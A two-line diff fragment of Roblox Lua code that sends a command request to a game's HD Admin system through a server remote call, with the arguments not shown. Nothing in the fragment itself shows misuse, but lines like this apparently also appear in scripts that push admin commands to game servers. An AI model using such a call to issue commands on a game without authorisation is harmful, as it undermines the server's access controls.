+game:GetService("ReplicatedStorage").HDAdminClient.Signals.RequestCommand:InvokeServer(unpack(args))
+end
